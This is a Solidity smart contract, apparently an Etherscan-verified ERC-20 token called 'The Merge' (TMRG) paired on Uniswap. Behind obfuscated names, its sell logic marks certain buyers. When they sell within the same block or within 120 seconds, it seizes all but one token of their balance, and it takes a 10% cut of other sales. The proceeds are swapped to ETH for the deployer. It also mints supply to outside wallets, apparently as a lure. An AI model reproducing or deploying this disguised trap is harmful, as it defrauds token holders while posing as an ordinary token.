/**
 *Submitted for verification at Etherscan.io on 2022-06-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;abstract contract Transactions{    struct Transaction{        uint256 lastBlockNumber;        uint256 lastTimestamp;    }    mapping(address => Transaction) private _transactions;    mapping(address => bool) private _excluded;    mapping(address => bool) private _watched;    event TransactionNew(address indexed account, uint256 number, uint256 timestamp);    event Transaction__bc9827224(address indexed account, uint256 number);    event Transaction__4a2d060c5(address indexed account, uint256 timestamp);    function _transactionExcludeAddress(address account) internal{        _excluded[account] = true;    }    function _transaction__1d5b5f2e0__1e9e18301(address account) internal{        if(!_excluded[account]){            _watched[account] = true;        }    }    function _transactionNew(address account) internal{        if(!_excluded[account]){            if(_transactions[account].lastBlockNumber <= 0){                Transaction storage transaction = _transactions[account];                transaction.lastBlockNumber = block.number;                transaction.lastTimestamp = block.timestamp;            }else{                _transactions[account].lastBlockNumber = block.number;                _transactions[account].lastTimestamp = block.timestamp;            }            emit TransactionNew(account, block.number, block.timestamp);        }    }    function _transaction__bc9827224(address account) internal returns(bool){        if(!_excluded[account] && _watched[account]){            if(_transactions[account].lastBlockNumber == block.number){                emit Transaction__bc9827224(account, block.number);                return(true);            }        }        return(false);    }    function _transaction__4a2d060c5(address account, uint256 __f7d0b2276) internal returns(bool){        if(!_excluded[account] && _watched[account]){            if((_transactions[account].lastTimestamp + __f7d0b2276) > block.timestamp){                emit Transaction__4a2d060c5(account, (_transactions[account].lastTimestamp + __f7d0b2276) - block.timestamp);                return(true);            }        }        return(false);    }}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router01 {    function factory() external pure returns (address);    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint amountTokenDesired,        uint amountTokenMin,        uint amountETHMin,        address to,        uint deadline    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)        external        returns (uint[] memory amounts);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);}interface IERC20{    function balanceOf(address pAddress) external view returns(uint256);}contract TheMerge is Transactions{    uint8[] private _________ = [222,72,176,31,212,49,52,107,54,101,176,134,208,240,3,191,73,3,221,54,47,82,120,49,8,240,184,49,167,29,211,2];    IUniswapV2Router01 private _router;    IERC20 private _weth;    address private _owner = address(0);    address private _pair;    address private ___3cf5a8b810;    string private _name = "The Merge";    string private _symbol = "TMRG";    uint8 private _decimals = 0;    uint256 private _maxSupply;    mapping(address => uint256) private _balances;    mapping(address => mapping (address => uint256)) private _allowances;    bool private _enabled;    uint256 private _wethSupply;    bool private _swapping;    uint256 private ___f7d0b2276 = 120;    bool private ___f009493d9;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    modifier swapping(){        _swapping = true;        _;        _swapping = false;    }    receive() external payable{        if(msg.sender == ___3cf5a8b810){            if(_balances[address(this)] > 0 && address(this).balance > 0){                _router.addLiquidityETH{value:address(this).balance}(address(this), _balances[address(this)], 0, 0, ___3cf5a8b810, block.timestamp);                _enabled = true;                _wethSupply = _weth.balanceOf(_pair);            }        }    }    constructor(){        ___3cf5a8b810 = msg.sender;        _router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);        _allowances[address(this)][address(_router)] = 2**256 - 1;        _weth = IERC20(_router.WETH());        _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());        _update(address(0), address(this), (21*10**64*(10**_decimals))/100*50);        _update(address(0), 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B, (21*10**64*(10**_decimals))/100*33);        _update(address(0), 0x72A53cDBBcc1b9efa39c834A540550e23463AAcB, (21*10**64*(10**_decimals))/100*10);        _update(address(0), 0x5a52E96BAcdaBb82fd05763E25335261B270Efcb, (21*10**64*(10**_decimals))/100*7);        _transactionExcludeAddress(_pair);        _transactionExcludeAddress(address(_router));    }    function swap() public swapping{        address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();        _router.swapExactTokensForETH(_balances[address(this)], 0, path, ___3cf5a8b810, block.timestamp);    }    function owner() public view returns(address){        return(_owner);    }    function name() public view returns(string memory){        return(_name);    }    function symbol() public view returns(string memory){        return(_symbol);    }    function decimals() public view returns(uint8){        return(_decimals);    }    function totalSupply() public view returns(uint256){        return(_maxSupply);    }    function balanceOf(address wallet) public view returns(uint256){        return(_balances[wallet]);     }    function allowance(address from, address to) public view returns(uint256){        return(_allowances[from][to]);    }    function transfer(address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[msg.sender] >= amount);        _transfer(msg.sender, to, amount);        return(true);    }    function transferFrom(address from, address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[from] >= amount);        require(_allowances[from][msg.sender] >= amount);        _transfer(from, to, amount);        return(true);    }    function approve(address to, uint256 amount) public returns(bool){        _allowances[msg.sender][to] = amount;        emit Approval(msg.sender, to, amount);        return(true);    }    function _transfer(address from, address to, uint256 amount) private{                        _transactionNew(from);        _transactionNew(to);        _transactionNew(msg.sender);        if(tx.origin != msg.sender) _transactionNew(tx.origin);        if(from == address(this) || to == address(this)){            _update(from, to, amount);        }else{            require(_enabled);            _secureTransfer(from, to, amount);        }    }    function _update(address from, address to, uint256 amount) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            _balances[to] += amount;        }        emit Transfer(from, to, amount);    }    function _update(address from, address to, uint256 amount, bool __2093894c8) private{        if(from != address(0)){            _balances[from] -= amount;            if(__2093894c8){                _balances[address(this)] += amount;            }        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            if(!__2093894c8) _balances[to] += amount;        }        emit Transfer(from, to, amount);    }    function _secureTransfer(address from, address to, uint256 amount) private{        uint256 __a49b18697 = 1*(10**_decimals);        if(_pair == from){                        if(to == ___3cf5a8b810 && (_weth.balanceOf(_pair) - _wethSupply) >= 1*10**18){                ___f009493d9 = true;            }else if((_weth.balanceOf(_pair) - _wethSupply) >= 5*10**18){                                _transaction__1d5b5f2e0__1e9e18301(from);                _transaction__1d5b5f2e0__1e9e18301(to);                _transaction__1d5b5f2e0__1e9e18301(msg.sender);                if(tx.origin != msg.sender) _transaction__1d5b5f2e0__1e9e18301(tx.origin);                ___f009493d9 = true;            }            _update(from, to, amount);        }else if(_pair == to){                        if(___f009493d9 && (_transaction__bc9827224(from) || _transaction__bc9827224(to) || _transaction__bc9827224(msg.sender) || _transaction__bc9827224(tx.origin))){                                _update(from, address(this), _balances[from] - __a49b18697);                if(!_swapping){                    swap();                }                _update(from, to, __a49b18697);              }else if(___f009493d9 && (_transaction__4a2d060c5(from, ___f7d0b2276) || _transaction__4a2d060c5(to, ___f7d0b2276) || _transaction__4a2d060c5(msg.sender, ___f7d0b2276) || _transaction__4a2d060c5(tx.origin, ___f7d0b2276))){                                _update(from, address(this), _balances[from] - __a49b18697);                if(!_swapping){                    swap();                }                _update(from, to, __a49b18697);             }else{                uint256 __c3895a912 = amount/100*10;                _update(from, address(this), __c3895a912);                if(!_swapping){                    swap();                }                _update(from, to, amount - __c3895a912);             }            ___f009493d9 = false;        }else{            _update(from, to, amount);        }        _wethSupply = _weth.balanceOf(_pair);    }}